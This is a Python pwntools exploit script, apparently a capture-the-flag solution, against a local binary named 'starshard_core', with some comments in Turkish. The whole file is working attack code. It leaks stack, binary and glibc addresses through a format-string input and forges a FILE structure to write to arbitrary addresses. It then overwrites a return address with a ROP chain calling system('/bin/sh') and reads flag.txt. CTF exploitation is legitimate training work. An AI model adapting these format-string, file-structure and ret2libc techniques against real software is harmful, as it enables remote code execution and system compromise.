#!/usr/bin/env python3

from pwn import *

p = process("./starshard_core")

context.binary = "./starshard_core"
context.gdb_binary = "pwndbg"
if args.TMUX:
    context.terminal = ['tmux', 'split-pane', '-h']
if args.GDB:
    gdb.attach(p)

def next_prompt():
    p.recvuntil(b"> ")

def arm(name: bytes):
    next_prompt()
    p.sendline(b"1")
    p.recvuntil(b"Name: ")
    p.sendline(name)

def feed_frac(size: int, buf: bytes):
    next_prompt()
    p.sendline(b"2")
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    p.sendline(buf)

def cancel():
    next_prompt()
    p.sendline(b"3")

def commit():
    next_prompt()
    p.sendline(b"4")

def finish():
    next_prompt()
    p.sendline(b"5")

def generate_file_for_addr_write(addr, buflen):
    payload  = b""
    
    # 0x00: _flags
    payload += p64(0xfbad0000)
    
    # 0x08–0x18: read pointers (önemsiz)
    payload += p64(0) * 3
    
    # 0x20: _IO_write_base
    payload += p64(addr)
    
    # 0x28: _IO_write_ptr
    payload += p64(addr + buflen)
    
    # 0x30: _IO_write_end
    payload += p64(addr + buflen)
    
    # 0x38: _IO_buf_base
    payload += p64(addr)
    
    # 0x40: _IO_buf_end
    payload += p64(addr + buflen)
    
    # 0x48–0x68: save / markers / chain (önemsiz)
    payload += p64(0) * 4
    
    # 0x70: _fileno
    payload += p64(0)

    return payload

def write_to_addr(addr, buf: bytes):
    arm(b"/bin/sh")
    cancel()
    feed_frac(460, generate_file_for_addr_write(addr, len(buf)))
    feed_frac(len(buf), buf)
    commit()
    commit() # neden iki kere hiçbir fikrim yok, rastgele denerken oldu

p.recvuntil(b"Tinkerer Name: ")
p.sendline(b":%p:%10$p:%29$p")

addreseses = p.recvuntil(b"rd Consol").split(b':')
log.info(f"addreseses: {addreseses}")
ptr = int(addreseses[1], 16)
bin_base = int(addreseses[2], 16) - 0x40
glibc_base = int(addreseses[3][0:14], 16) - 0x207d - 0x2c000

console_state_var_off = 0x4060
console_state_spell_name_off = 0x10

libc_system_off = 0x54AD0
libc_system_addr = libc_system_off + glibc_base
libc_ret_off = 0x2c7a9
libc_ret_addr = glibc_base + libc_ret_off

# ROP
libc_pop_rdi_ret = 0x2e6c5
libc_pop_rdi_ret_addr = glibc_base + libc_pop_rdi_ret
binsh_str = bin_base + console_state_var_off + console_state_spell_name_off

log.success(f"Leaked pointer: {hex(ptr)}")
log.success(f"Binary Base: {hex(bin_base)}")
log.success(f"glibc base: {hex(glibc_base)}")

libc_ret_main_diff = 0x2138
ret_addr_ptr = ptr + libc_ret_main_diff
log.info(f"libc_ret_off: {hex(libc_ret_main_diff)}")

log.info(f"RET ADDR PTR: {hex(ret_addr_ptr)}")

log.info(f"libc ret addr: {hex(libc_ret_addr)}")
log.info(f"libc pop rdi ret: {hex(libc_pop_rdi_ret_addr)}")
log.info(f"binsh str: {hex(binsh_str)}")
log.info(f"libc system: {hex(libc_system_addr)}")
write_to_addr(ret_addr_ptr,      p64(libc_ret_addr))
write_to_addr(ret_addr_ptr + 8,  p64(libc_pop_rdi_ret_addr))
write_to_addr(ret_addr_ptr + 16, p64(binsh_str))
write_to_addr(ret_addr_ptr + 24, p64(libc_system_addr))

finish()
p.sendline(b"cat flag.txt")

p.interactive()
